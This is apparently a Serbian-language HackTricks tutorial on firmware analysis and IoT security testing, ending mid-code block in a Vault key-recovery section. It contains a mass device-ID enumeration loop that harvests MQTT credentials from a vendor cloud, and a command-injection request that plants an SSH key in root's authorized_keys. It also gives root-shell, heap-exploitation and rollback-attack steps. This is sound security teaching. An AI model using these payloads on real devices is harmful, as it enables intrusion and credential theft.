# Analiza firmware-a

{{#include ../../banners/hacktricks-training.md}}

## **Uvod**

### Povezani resursi


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware je ključni softver koji uređajima omogućava pravilan rad upravljanjem komunikacijom između hardverskih komponenti i softvera sa kojim korisnici stupaju u interakciju i njenim omogućavanjem. Smešten je u trajnoj memoriji, čime se osigurava da uređaj može da pristupi ključnim instrukcijama od trenutka uključivanja, što dovodi do pokretanja operativnog sistema. Ispitivanje i potencijalno menjanje firmware-a predstavlja kritičan korak u identifikovanju sigurnosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključni početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- CPU arhitekturi i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Hardverskom rasporedu i datasheet-ovima
- Metrikama codebase-a i lokacijama izvornog koda
- Spoljnim bibliotekama i tipovima licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Sigurnosnim procenama i identifikovanim ranjivostima

U tu svrhu, alati za **open-source intelligence (OSINT)** su od neprocenjive vrednosti, kao i analiza svih dostupnih komponenti open-source softvera kroz ručne i automatizovane procese pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može koristiti za pronalaženje potencijalnih problema.

## **Nabavljanje firmware-a**

Firmware se može nabaviti na različite načine, pri čemu svaki od njih ima sopstveni nivo složenosti:

- **Direktno** od izvora (developeri, proizvođači)
- **Izgradnjom** na osnovu dostavljenih uputstava
- **Preuzimanjem** sa zvaničnih sajtova za podršku
- Korišćenjem **Google dork** upita za pronalaženje hostovanih firmware datoteka
- Direktnim pristupom **cloud storage-u**, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** putem man-in-the-middle tehnika
- **Ekstrakcijom** sa uređaja kroz konekcije kao što su **UART**, **JTAG** ili **PICit**
- **Njuškanjem** zahteva za ažuriranje unutar komunikacije uređaja
- Identifikovanjem i korišćenjem **hardcoded update endpoint-a**
- **Dumpovanjem** iz bootloader-a ili sa mreže
- **Uklanjanjem i čitanjem** memorijskog čipa kada sve ostalo ne uspe, uz korišćenje odgovarajućih hardverskih alata

### UART-only logs: force a root shell via U-Boot env in flash

Ako se UART RX ignoriše (samo logovi), i dalje možete prinudno pokrenuti init shell tako što ćete **offline izmeniti U-Boot environment blob**:<sup>[[6]](#references)</sup>

1. Napravite dump SPI flash-a pomoću SOIC-8 klipse i programatora (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locirajte U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo upišite samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na embedded uređajima kod kojih je shell bootloader-a onemogućen, ali je env particija upisiva putem spoljnog pristupa flash memoriji.

## Analiziranje firmware-a

Sada kada **imate firmware**, potrebno je da iz njega izvučete informacije kako biste znali kako da ga tretirate. Za to možete koristiti različite alate:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropiju** slike pomoću `binwalk -E <bin>`. Ako je entropija niska, verovatno nije enkriptovana. Ako je entropija visoka, verovatno je enkriptovana (ili na neki način kompresovana).

Pored toga, možete koristiti ove alate za izdvajanje **datoteka ugrađenih unutar firmware-a**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za pregled datoteke.

### Dobavljanje fajl sistema

Pomoću prethodno pomenutih alata, kao što je `binwalk -ev <bin>`, trebalo je da budete u mogućnosti da **izdvojite fajl sistem**.\
Binwalk ga obično izdvaja unutar **foldera nazvanog prema tipu fajl sistema**, koji je najčešće jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje fajl sistema

Ponekad binwalk **nema magic byte fajl sistema u svojim potpisima**. U tim slučajevima koristite binwalk da **pronađete offset fajl sistema i izdvojite kompresovani fajl sistem** iz binarne datoteke, a zatim ga **ručno izdvojite** u skladu sa njegovim tipom, koristeći korake u nastavku.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokrenite sledeću **dd komandu** za izdvajanje Squashfs sistema datoteka.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u gornjem primeru)

`$ unsquashfs dir.squashfs`

Datoteke će se nakon toga nalaziti u direktorijumu "`squashfs-root`".

- CPIO arhivske datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 file systems

`$ jefferson rootfsfile.jffs2`

- Za ubifs file systems sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware-a

Kada se firmware pribavi, neophodno je detaljno ga analizirati kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz firmware image-a.

### Početni alati za analizu

Dat je skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu pri identifikovanju tipova datoteka, izdvajanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i file systems:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Za procenu statusa enkripcije image-a proverava se **entropy** pomoću `binwalk -E <bin>`. Niska entropy ukazuje na odsustvo enkripcije, dok visoka entropy ukazuje na moguću enkripciju ili kompresiju.

Za ekstrakciju **embedded files**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za inspekciju datoteka.

### Ekstrakcija filesystem-a

Korišćenjem `binwalk -ev <bin>` obično se može ekstraktovati filesystem, često u direktorijum nazvan prema tipu filesystem-a (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip filesystem-a zbog nedostajućih magic bytes, neophodna je ručna ekstrakcija. To podrazumeva korišćenje alata `binwalk` za pronalaženje offset-a filesystem-a, nakon čega se koristi komanda `dd` za izdvajanje filesystem-a:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Nakon toga, u zavisnosti od tipa filesystem-a (npr. squashfs, cpio, jffs2, ubifs), koriste se različite komande za ručno izdvajanje sadržaja.

### Analiza filesystem-a

Kada je filesystem izdvojen, počinje potraga za bezbednosnim propustima. Pažnja se obraća na nesigurne mrežne daemon-e, hardkodovane kredencijale, API endpoint-e, funkcionalnosti update servera, nekompajlirani kod, startup skripte i kompajlirane binarne fajlove za offline analizu.

**Ključne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** za korisničke kredencijale
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i skriptne fajlove zbog potencijalnih ranjivosti
- Embedded binarne fajlove za dalju analizu
- Uobičajene web servere i binarne fajlove IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar filesystem-a:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih fajlova

I source code i kompajlirani binarni fajlovi pronađeni u filesystem-u moraju se detaljno proveriti zbog ranjivosti. Alati kao što je **checksec.sh** za Unix binarne fajlove i **PESecurity** za Windows binarne fajlove pomažu u identifikaciji nezaštićenih binarnih fajlova koji bi mogli biti iskorišćeni.

## Preuzimanje cloud konfiguracije i MQTT kredencijala putem izvedenih URL tokena

Mnogi IoT hub-ovi preuzimaju konfiguraciju specifičnu za uređaj sa cloud endpoint-a koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodovane tajne, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen kao heksadecimalna vrednost velikim slovima

Ovaj dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, često otkrivajući MQTT kredencijale u plaintext-u i prefikse topic-a.

Praktičan postupak:

1) Izdvojite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i uhvatite logove:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Potražite redove koji ispisuju obrazac URL-a cloud konfiguracije i adresu broker-a, na primer:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Oporavite STATIC_KEY i algoritam tokena iz firmware-a

- Učitajte binarne datoteke u Ghidra/radare2 i pretražite putanju konfiguracije ("/pf/") ili upotrebu MD5-a.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedite token u Bash-u i pretvorite digest u velika slova:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Prikupljanje cloud konfiguracije i MQTT akreditiva

- Sastavite URL i preuzmite JSON pomoću curl-a; analizirajte ga pomoću jq da biste izdvojili secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Iskoristite MQTT u čistom tekstu i slabe ACL-ove tema (ako postoje)

- Koristite pronađene akreditive da se pretplatite na maintenance teme i potražite osetljive događaje:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeracija predvidljivih ID-jeva uređaja (u velikom obimu, uz autorizaciju)

- Mnogi ekosistemi ugrađuju vendor OUI/product/type bajtove, nakon kojih sledi sekvencijalni sufiks.
- Možete iterirati kroz ID-jeve kandidata, programski izvoditi tokene i preuzimati konfiguracije:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek pribavite izričitu autorizaciju pre pokušaja masovne enumeracije.
- Kad god je moguće, prednost dajte emulaciji ili static analysis pristupu za otkrivanje secrets bez menjanja ciljnog hardware-a.


Proces emulacije firmware-a omogućava **dynamic analysis** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove povezane sa zavisnostima od hardware-a ili architecture, ali prebacivanje root filesystem-a ili određenih binaries na uređaj sa odgovarajućom architecture i endianness vrednošću, kao što je Raspberry Pi, ili na unapred pripremljenu virtualnu mašinu, može olakšati dalje testiranje.

### Emulacija pojedinačnih binaries

Za ispitivanje pojedinačnih programa ključno je utvrditi endianness i CPU architecture programa.

#### Primer sa MIPS architecture

Za emulaciju binary-ja sa MIPS architecture može se koristiti komanda:
```bash
file ./squashfs-root/bin/busybox
```
I za instalaciju neophodnih alata za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Za MIPS (big-endian) koristi se `qemu-mips`, a za binarne datoteke sa little-endian formatom koristi se `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke proces je sličan, pri čemu se za emulaciju koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmware-a, automatizujući proces i pomažući u dinamičkoj analizi.

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi stvarno ili emulirano okruženje uređaja. Od ključne je važnosti održavati shell pristup OS-u i filesystem-u. Emulacija možda neće savršeno oponašati interakcije sa hardverom, zbog čega će povremeno biti potrebno ponovo pokrenuti emulaciju. Analiza treba ponovo da obuhvati filesystem, da iskoristi izložene web-stranice i mrežne servise i da istraži ranjivosti bootloader-a. Testovi integriteta firmware-a od ključne su važnosti za identifikovanje potencijalnih backdoor ranjivosti.

## Tehnike runtime analize

Runtime analiza obuhvata interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju, uz korišćenje alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoint-a i identifikovanje ranjivosti pomoću fuzzing-a i drugih tehnika.

Za embedded ciljeve bez kompletnog debugger-a, **kopirajte statički linkovan `gdbserver`** na uređaj i povežite se sa njim udaljeno:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapiranje Zigbee / radio-co-processor poruka

Na IoT hubovima RF stack je često podeljen između **radio MCU-a** i Linux userland procesa. Koristan workflow je mapirati putanju:<sup>[[8]](#references)</sup>

1. **RF frame** u vazduhu
2. **parser na strani kontrolera** na radio MCU-u
3. **tekstualni serial/UART ili TLV protokol** prosleđen Linuxu (na primer `/dev/tty*`)
4. **application dispatcher** u glavnom daemonu
5. **protocol-specific handler / state machine**

Ova arhitektura stvara dva reversing cilja umesto jednog. Ako kontroler pretvara binarne radio frame-ove u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, pronađite:

- **message groups** i dispatch tabele
- Koje poruke mogu doći sa **network-a**, a koje potiču od samog kontrolera
- Tačna **manufacturer-specific discriminator** polja (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji handleri su dostupni samo tokom faza **commissioning-a**, discovery-ja ili preuzimanja firmware/modela

Za Zigbee konkretno, snimite pairing saobraćaj i proverite da li se cilj i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, sniffing commissioning saobraćaja može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, zato zabeležite da li ih testirani uređaj zaista primenjuje.

### Manufacturer-specific protocol handleri i FSM-gated dostupnost

Vendor-specific Zigbee/ZCL komande su često bolja meta od standardizovanih cluster-a zato što prosleđuju podatke **custom parsing code-u** i internim **FSM-ovima** sa manje provereno pouzdanom validacijom.<sup>[[8]](#references)</sup>

Praktični workflow:

- Reverse-ujte command dispatcher dok ne pronađete **vendor-only handler**.
- Rekonstruišite tabele za **FSM state**, **event**, **check**, **action** i **next-state**.
- Identifikujte **transitional states** koji se automatski pomeraju napred, kao i retry/error grane koje na kraju resetuju ili oslobađaju state pod kontrolom napadača.
- Potvrdite koje legitimne protocol exchanges su potrebne da bi se daemon postavio u ranjivo stanje, umesto da pretpostavite da je buggy handler uvek dostupan.

Za timing-sensitive protokole, packet replay iz Python framework-a može biti prespor. Pouzdaniji pristup je emulirati legitiman uređaj na stvarnom hardware-u (na primer **nRF52840**) uz vendor-grade stack, kako biste mogli da izložite odgovarajuće **endpoints**, **attributes** i commissioning timing.

### Klasa fragmented-download bugova u embedded daemonima

Ponavljajuća klasa firmware bugova pojavljuje se u **fragmented blob/model/configuration download-ima**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) čuva `ctx->total_size` i poziva `malloc(total_size)`.
2. Kasniji fragmenti proveravaju samo attacker-controlled **packet-local** polja, kao što je `packet_total_size >= offset + chunk_len`.
3. Copy koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere u odnosu na **originalnu alociranu veličinu**.

Ovo napadaču omogućava da pošalje:

- Prvi validan fragment sa **malom** deklarisanom ukupnom veličinom, kako bi se primorala mala heap alokacija.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Falsifikovanu packet-local veličinu koja zadovoljava nove provere, a ipak prepisuje prvobitno alocirani buffer.

Kada se ranjiva putanja nalazi iza commissioning logike, exploitation mora uključiti dovoljno **device emulation-a** da se cilj dovede u očekivano stanje preuzimanja modela ili blob-a pre slanja malformed fragmenata.

### Protocol-driven `free()` okidači

U embedded daemonima, najlakši način za pokretanje heap metadata exploitation-a često nije „čekanje cleanup-a“, već **forsiranje sopstvenog error handling-a protokola**:<sup>[[8]](#references)</sup>

- Pošaljite malformed follow-up fragmente kako biste FSM pomerili u **retry** ili **error** state.
- Pređite retry threshold, tako da daemon **resetuje context** i oslobodi oštećeni buffer.
- Iskoristite ovaj predvidivi `free()` za pokretanje allocator-side primitiva pre nego što se proces sruši iz nepovezanih razloga.

Ovo je naročito korisno protiv **musl/uClibc/dlmalloc-like** allocator-a u embedded Linux-u, gde oštećivanje chunk metadata može pretvoriti unlink/unbin logiku u write primitive. Stabilan obrazac je oštetiti **size field** kako bi se allocator traversal preusmerio na **fake chunks** postavljene unutar overflowed buffer-a, umesto trenutnog prepisivanja stvarnih bin pointer-a i rušenja procesa.

## Binary Exploitation and Proof-of-Concept

Razvoj PoC-a za identifikovane ranjivosti zahteva duboko razumevanje arhitekture cilja i programiranje u jezicima nižeg nivoa. Binary runtime zaštite su retke u embedded sistemima, ali kada postoje, tehnike kao što je Return Oriented Programming (ROP) mogu biti neophodne.

### Beleške o uClibc fastbin exploitation-u (embedded Linux)

- **Fastbins + consolidation:** uClibc koristi fastbins slične glibc-u. Kasnija velika alokacija može pokrenuti `__malloc_consolidate()`, zato svaki fake chunk mora proći provere (ispravna veličina, `fd = 0` i okolni chunk-ovi prepoznati kao „u upotrebi“).<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ako je ASLR omogućen, ali je glavni binary **non-PIE**, adrese `.data/.bss` unutar binary-ja su stabilne. Možete ciljati region koji već liči na validno zaglavlje heap chunk-a kako biste fastbin alokaciju usmerili na **function pointer table**.
- **Parser-stopping NUL:** kada se JSON parsira, `\x00` u payload-u može zaustaviti parsing, uz zadržavanje završnih attacker-controlled bajtova za stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može postaviti izvršni shellcode u poznati mapping i skočiti na njega.

## Pripremljeni operativni sistemi za Firmware Analysis

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) obezbeđuju prekonfigurisana okruženja za firmware security testing, opremljena neophodnim alatima.

## Pripremljeni OS-ovi za analizu Firmware-a

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen obavljanju security assessment-a i penetration testing-a Internet of Things (IoT) uređaja. Štedi mnogo vremena tako što obezbeđuje prekonfigurisano okruženje sa svim neophodnim učitanim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): operativni sistem zasnovan na Ubuntu 18.04 za embedded security testing, sa unapred instaliranim alatima za firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Čak i kada vendor implementira cryptographic signature provere za firmware image-ove, **zaštita od version rollback-a (downgrade-a) često izostaje**. Kada boot- ili recovery-loader samo proverava potpis pomoću ugrađenog javnog ključa, ali ne poredi *version* (ili monotonic counter) image-a koji se flash-uje, napadač može legitimno instalirati **stariji, ranjivi firmware koji i dalje ima validan potpis** i tako ponovo uvesti zakrpljene ranjivosti.<sup>[[4]](#references)</sup>

Tipičan workflow napada:

1. **Nabavite stariji potpisani image**
* Preuzmite ga sa vendor-ovog javnog download portala, CDN-a ili support sajta.
* Izvucite ga iz pratećih mobile/desktop aplikacija (npr. unutar Android APK-a, pod `assets/firmware/`).
* Preuzmite ga iz third-party repository-ja kao što su VirusTotal, Internet arhive, forumi itd.
2. **Upload-ujte ili poslužite image uređaju** putem bilo kog exposed update channel-a:
* Web UI, mobile-app API, USB, TFTP, MQTT itd.
* Mnogi consumer IoT uređaji izlažu *unauthenticated* HTTP(S) endpoint-e koji prihvataju Base64-encoded firmware blob-ove, dekoduju ih na server-side-u i pokreću recovery/upgrade.
3. Nakon downgrade-a, iskoristite ranjivost koja je zakrpljena u novijem release-u (na primer filter za command injection koji je dodat kasnije).
4. Opciono ponovo flash-ujte najnoviji image ili onemogućite update-e kako biste izbegli detekciju nakon ostvarivanja persistence-a.

### Primer: Command Injection nakon Downgrade-a
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivom firmware-u (vraćenom na stariju verziju), parametar `md5` se direktno nadovezuje na shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (ovde – omogućavanje root pristupa zasnovanog na SSH ključu). Kasnije verzije firmware-a uvele su osnovni filter znakova, ali zbog nepostojanja zaštite od vraćanja na stariju verziju ova ispravka postaje beskorisna.<sup>[[4]](#references)</sup>

### Izdvajanje Firmware-a iz mobilnih aplikacija

Mnogi proizvođači uključuju kompletne firmware slike u svoje prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj putem Bluetooth-a/Wi-Fi-ja. Ovi paketi se obično čuvaju nešifrovani u APK/APEX datoteci, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju preuzimanje potpisanih firmware slika bez pristupa fizičkom hardveru.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass anti-rollback zaštite koja postoji samo u updater-u kod A/B slot dizajna

Neki vendors ipak implementiraju anti-downgrade **ratchet**, ali samo unutar *updater* logike (na primer UDS rutine preko CAN-a, recovery komande ili userspace OTA agenta). Ako **bootloader** kasnije proverava samo image signature/CRC i veruje partition table-u ili slot metadata podacima, rollback zaštita se i dalje može zaobići.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Firmware metadata sadrži i descriptor verzije i **security ratchet** / monotoni counter.
- Updater upoređuje image ratchet sa vrednošću sačuvanom u persistent storage-u i odbija starije signed image fajlove.
- Bootloader ne parsira taj ratchet i proverava samo header, CRC i signature pre bootovanja izabranog slota.
- Aktivacija slota čuva se odvojeno u partition table-u ili per-slot generation counter-u i nije kriptografski vezana za tačan firmware digest koji je validiran.

Ovo stvara primitivu **validate-one-image / boot-another-image** u dual-slot sistemima. Ako attacker može da natera updater da označi slot B kao sledeći boot target koristeći current signed image, a zatim pre reboot-a prepiše slot B, bootloader i dalje može bootovati downgraded image jer veruje samo već commit-ovanim slot metadata podacima.

Uobičajen abuse pattern:

1. Upload-ujte **current signed** firmware u pasivni slot i pokrenite normalnu validation/switch rutinu tako da layout označi taj slot kao sledeći active.
2. **Još nemojte rebootovati**. Ponovo uđite u slot-preparation/erase rutinu u istoj sesiji.
3. Iskoristite stale boot-state ili stale slot-selection logiku tako da updater obriše **isti fizički slot** koji je upravo promovisan.
4. Upišite **older but still signed** firmware u taj slot.
5. Preskočite validation rutinu koja primenjuje ratchet i direktno rebootujte.
6. Bootloader bira promovisani slot, proverava samo signature/integrity i bootuje stari image.

Na šta treba obratiti pažnju pri reverse engineering-u A/B update implementacija:

- Izbor slota izveden iz **boot-time flags** koji se ne osvežavaju nakon uspešnog switch-a.
- Rutina nalik `prepare_passive_slot()` koja briše slot na osnovu stale state-a umesto **trenutnog commit-ovanog layout-a**.
- Funkcija nalik `part_write_layout()` koja samo uvećava **generation counter** / active flag i ne čuva hash validiranog image-a.
- Ratchet provere implementirane u userspace-u ili updater kodu, ali **ne** u ROM / bootloader / secure boot fazama.
- Erase ili recovery rutine koje ostavljaju slot označenim kao bootable čak i nakon što je njegov sadržaj uklonjen i ponovo upisan.

### Checklist za procenu update logike

* Da li su transport/authentication *update endpoint-a* adekvatno zaštićeni (TLS + authentication)?
* Da li device upoređuje **version numbers** ili **monotoni anti-rollback counter** pre flashovanja?
* Da li se image verifikuje unutar secure boot chain-a (npr. signatures proverava ROM code)?
* Da li **bootloader primenjuje isti ratchet** kao updater, umesto da proverava samo signature/CRC?
* Da li su metadata za aktivaciju slota **vezana za validated firmware digest/version**, ili slot može da se izmeni nakon promocije?
* Nakon uspešnog switch-a slota, da li je device primoran da rebootuje ili su kasnije update/erase rutine i dalje dostupne u istoj sesiji?
* Da li userland code obavlja dodatne sanity provere (npr. dozvoljeni partition map, model number)?
* Da li *partial* ili *backup* update flow-ovi ponovo koriste istu validation logiku?

> 💡  Ako bilo šta od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Vulnerable firmware za vežbu

Za vežbanje otkrivanja ranjivosti u firmware-u, koristite sledeće vulnerable firmware projekte kao početnu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Oporavak ključeva za dekripciju firmware-a iz embedded KMS/Vault state-a

Kada update image kombinuje male plaintext metadata podatke sa velikim blob-om visoke entropije, prvo uradite container triage, a tek onda brute-force bilo čega:<sup>[[1]](#references)</sup>

- Dump-ujte headers, offsets i line boundaries pomoću `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično znači OpenSSL `enc` format: sledećih 8 bajtova predstavlja salt, a preostali bajtovi su ciphertext.
- Base64 field koji se dekodira u tačno `256` bajtova snažan je pokazatelj da gledate RSA-2048 ciphertext koji wrap-uje random firmware password/session key.
- Detached PGP material u istom fajlu često štiti samo authenticity; nemojte pretpostaviti da predstavlja mechanism za confidentiality.

Ako static key hunting (`grep`, `strings`, PEM/PGP searches) ne uspe, reverse-engineer-ujte **operational decrypt path** umesto da samo tražite private keys:

- Decompile-ujte updater / management binary i pratite ko čita encrypted blob, koji helper/API ga unwrap-uje i koje logical key name traži.
- Pretražite extracted root filesystem za KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit fajlove i init skripte.
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ili lokalne KMS auto-unseal skripte tretirajte kao ekvivalent private-key material-u.

Ako appliance isporučuje originalni Vault binary i storage backend, replay-ovanje tog environment-a obično je jednostavnije od ponovne implementacije Vault internals-a:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
